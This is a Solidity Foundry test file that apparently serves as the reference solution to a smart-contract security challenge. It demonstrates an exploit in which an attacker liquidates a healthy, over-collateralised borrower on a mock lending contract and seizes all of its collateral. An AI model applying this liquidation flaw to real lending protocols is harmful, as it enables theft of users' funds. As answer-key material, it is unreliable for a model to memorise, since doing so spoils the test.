// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {Lending} from "../src/Lending.sol";

/// Reference exploit: liquidate a HEALTHY, over-collateralised position and seize
/// its collateral.
contract LiquidationSolution is Test {
    MockERC20 collateralToken;
    MockERC20 debtToken;
    Lending lending;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        collateralToken = new MockERC20("Collateral", "COL");
        debtToken = new MockERC20("Debt", "DEBT");
        lending = new Lending(collateralToken, debtToken);
        debtToken.mint(address(lending), 1_000_000e18);

        // Victim: 10 collateral worth 1000 debt-units, borrows only 500 — healthy.
        collateralToken.mint(victim, 10e18);
        vm.startPrank(victim);
        collateralToken.approve(address(lending), type(uint256).max);
        lending.deposit(10e18);
        lending.borrow(500e18);
        vm.stopPrank();

        // Attacker holds enough debt token to repay the victim's debt.
        debtToken.mint(attacker, 500e18);
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        debtToken.approve(address(lending), type(uint256).max);
        lending.liquidate(victim); // healthy position — should NOT be liquidatable
        vm.stopPrank();

        assertEq(collateralToken.balanceOf(attacker), 10e18, "attacker seizes the healthy position's collateral");
    }
}
